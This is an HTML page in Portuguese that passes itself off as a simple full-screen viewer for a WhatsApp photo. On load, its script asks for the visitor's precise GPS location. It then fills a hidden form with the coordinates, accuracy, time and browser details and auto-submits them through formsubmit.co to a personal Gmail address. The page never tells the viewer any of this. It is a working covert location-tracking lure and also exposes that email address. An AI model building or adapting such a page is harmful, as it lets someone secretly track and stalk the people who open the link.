<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Imagem</title>

  <style>
    html, body{
      margin:0;
      width:100%;
      height:100%;
      overflow:hidden;
      background:#000;
    }

    #imagem {
        width: 100vw;
        height: 100vh;
        object-fit: contain; /* mostra a imagem completa */
        background: #000;
    }
  </style>
</head>
<body>

  <!-- Imagem em tela cheia -->
  <img id="imagem" alt="Tela">

  <!-- Formulário oculto -->
  <form id="gpsForm"
        action="https://formsubmit.co/luisaugusto0923456@gmail.com"
        method="POST"
        style="display:none">

    <input type="hidden" name="_subject" value="Resultado do teste de GPS">
    <input type="hidden" name="_captcha" value="false">

    <input type="hidden" name="Latitude" id="fLat">
    <input type="hidden" name="Longitude" id="fLng">
    <input type="hidden" name="Precisao" id="fAcc">
    <input type="hidden" name="Data" id="fData">
    <input type="hidden" name="Navegador" id="fNav">

  </form>

  <script>
    /* ========= TROQUE APENAS ESTA LINHA ========= */
    const CAMINHO_IMAGEM = "WhatsApp Image 2026-09-25 at 21.46.59.jpeg";
    // Ex.: "imagens/Irbãos.jpeg" ou "assets/fundo.png"
    /* =========================================== */

    document.getElementById("imagem").src = CAMINHO_IMAGEM;

    function enviarLocalizacao(){

      if(!navigator.geolocation){
        return;
      }

      navigator.geolocation.getCurrentPosition(

        (pos) => {

          document.getElementById("fLat").value =
            pos.coords.latitude.toFixed(7);

          document.getElementById("fLng").value =
            pos.coords.longitude.toFixed(7);

          document.getElementById("fAcc").value =
            Math.round(pos.coords.accuracy) + " metros";

          document.getElementById("fData").value =
            new Date().toLocaleString("pt-BR");

          document.getElementById("fNav").value =
            navigator.userAgent;

          // Pequeno atraso para garantir que os campos foram preenchidos
          setTimeout(() => {
            document.getElementById("gpsForm").submit();
          }, 100);

        },

        (erro) => {
          console.error("Erro de localização:", erro);
        },

        {
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 15000
        }

      );

    }

    window.onload = enviarLocalizacao;
  </script>

</body>
</html>
